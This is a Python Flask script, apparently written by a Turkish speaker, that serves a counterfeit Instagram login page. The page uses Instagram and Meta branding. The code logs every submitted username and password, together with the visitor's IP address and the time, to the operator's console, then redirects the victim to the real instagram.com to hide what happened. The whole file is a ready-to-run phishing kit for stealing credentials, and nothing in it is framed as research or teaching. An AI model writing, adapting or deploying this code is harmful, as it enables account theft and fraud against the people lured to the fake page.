from flask import Flask, request, render_template_string, redirect
from datetime import datetime
import socket
import logging
from colorama import init, Fore, Style
import flask.cli  # <- bu satırı ekle

# Flask server banner mesajını kapatıyoruz
flask.cli.show_server_banner = lambda *args: None

# Colorama başlat
init(autoreset=True)

# Werkzeug loglarını sustur (sadece error göster)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

login_page = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <link rel="icon" type="image/png" href="/static/img/instagram.png">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        .ss4 { position: absolute; top: 60px; left: 200px; width: 550px; }
        .igfont { position: absolute; top: 100px; left: 880px; width: 175px; }
        .usernameinput { margin-left: 810px; margin-top: 175px; width: 300px; height: 30px; }
        .passwordinput { margin-left: 810px; width: 300px; height: 30px; }
        .submitinput { margin-left: 815px; width: 300px; height: 35px; color: white; background-color: rgb(0, 158, 158); border: none; border-radius: 8px; }
        .yada { font-family: Arial, Helvetica, sans-serif; margin-left: 945px; color: rgb(128, 128, 128); }
        .facebooktext { margin-left: 885px; text-decoration: none; font-family: Arial, Helvetica, sans-serif; color: rgb(0, 82, 158); }
        .forgotpass { margin-left: 910px; text-decoration: none; font-family: Arial, Helvetica, sans-serif; color: rgb(0, 40, 78); }
        .kaydol { font-family: Arial, Helvetica, sans-serif; margin-left: 890px; }
        .kaydollink { font-family: Arial, Helvetica, sans-serif; text-decoration: none; }
        .meta { margin-left: 200px; }
    </style>
</head>
<body>
    <img src="/static/img/ss4.png" class="ss4" alt="Görsel">
    <img src="/static/img/instagramfont.png" class="igfont" alt="Görsel">

    <form method="POST">
        <input class="usernameinput" type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
        <br><br>
        <input class="passwordinput" type="password" name="password" placeholder="Şifre" required>
        <br><br>
        <input class="submitinput" type="submit" value="Giriş Yap">
    </form>

    <br><br>
    <span class="yada">YA DA</span>
    <br><br>
    <a href="#" class="facebooktext">
        <img src="/static/img/facebook.jpg" alt="Görsel">
        <span>Facebook ile Giriş Yap</span>
    </a>
    <br><br>
    <a href="#" class="forgotpass"><span>Şifreni mi unuttun?</span></a>
    <br><br>
    <span class="kaydol">Hesabın yok mu?</span>
    <a href="#" class="kaydollink"><span>Kaydol</span></a>
    <br><br><br>
    <img src="/static/img/meta.PNG" class="meta" alt="Görsel">
</body>
</html>
"""

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def get_real_ip():
    if request.headers.getlist("X-Forwarded-For"):
        return request.headers.getlist("X-Forwarded-For")[0].split(',')[0]
    return request.remote_addr

@app.route('/', methods=['GET', 'POST'])
def login():
    ip_address = get_real_ip()

    if request.method == 'GET':
        print(f"{Fore.GREEN}{ip_address} ip adresli cihaz siteye giriş yaptı.{Style.RESET_ALL}")
        return render_template_string(login_page)

    elif request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        print(f"\n{Fore.YELLOW}---------- FORM GÖNDERİLDİ ----------{Style.RESET_ALL}")
        print(f"{Fore.CYAN}IP Adres: {Fore.WHITE}{ip_address}")
        print(f"{Fore.CYAN}Kullanıcı adı: {Fore.WHITE}{username}")
        print(f"{Fore.CYAN}Şifre: {Fore.WHITE}{password}")
        print(f"{Fore.CYAN}Tarih: {Fore.WHITE}{timestamp}")
        print(f"{Fore.YELLOW}-------------------------------------\n{Style.RESET_ALL}")

        return redirect("https://www.instagram.com")

if __name__ == '__main__':
    local_ip = get_local_ip()
    port = 8080
    print(f"{Fore.MAGENTA}Uygulama başlatıldı: http://{local_ip}:{port}\n{Style.RESET_ALL}")

    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
